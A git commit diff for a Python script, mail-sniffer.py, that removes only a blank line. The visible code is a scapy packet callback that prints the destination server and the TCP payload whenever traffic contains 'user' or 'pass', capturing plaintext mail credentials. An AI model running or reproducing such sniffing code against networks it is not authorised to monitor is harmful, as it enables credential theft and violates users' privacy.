bf74192fc68c7bf41909fdc3d467378ce690e6b2
Samuel Riddle <30331129+sjriddle@users.noreply.github.com>
2018-10-03 07:06:45 -0600

    Update mail-sniffer.py

--- mail-sniffer.py
+++ mail-sniffer.py
@@ -4,7 +4,6 @@ from scapy.all import *
 def packet_callback(packet):
     if packet[TCP].payload:
         mail_packet = str(packet[TCP].payload)
-
         if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
             print("[*] Server: %s" % packet[IP].dst)
             print("[*] %s" % packet[TCP].payload)
